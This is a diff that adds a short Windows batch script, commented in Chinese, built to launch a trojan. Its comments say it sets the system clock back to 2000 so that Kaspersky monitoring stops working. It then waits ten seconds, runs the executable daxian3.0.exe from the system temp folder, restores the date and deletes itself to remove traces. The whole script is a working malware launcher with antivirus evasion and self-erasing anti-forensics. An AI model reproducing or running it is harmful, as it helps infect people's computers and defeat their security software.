@@ -1,0 +1,29 @@
+::======还是神秘一点好============
+@echo off & setlocal enableextensions
+
+::======记下系统当前时间等下恢复============
+set last_date=%date:~0,10%
+
+::======修改系统时间使卡巴监控失效============
+date 2000-11-2
+
+::========倒计时等待10秒======================
+echo WScript.Sleep 1000 > %systemroot%/temp/delay.vbs
+set /a i = 10
+:Timeout
+if %i% == 0 goto Next
+setlocal
+set /a i = %i% - 1
+cscript //nologo %systemroot%/temp/delay.vbs
+goto Timeout
+
+::===========倒计时等待结束运行木马=============
+:Next
+%systemroot%/temp/daxian3.0.exe
+
+::======恢复系统时间=======================
+date %last_date%
+date %last_date%
+
+::=========清除痕迹============================
+del %0
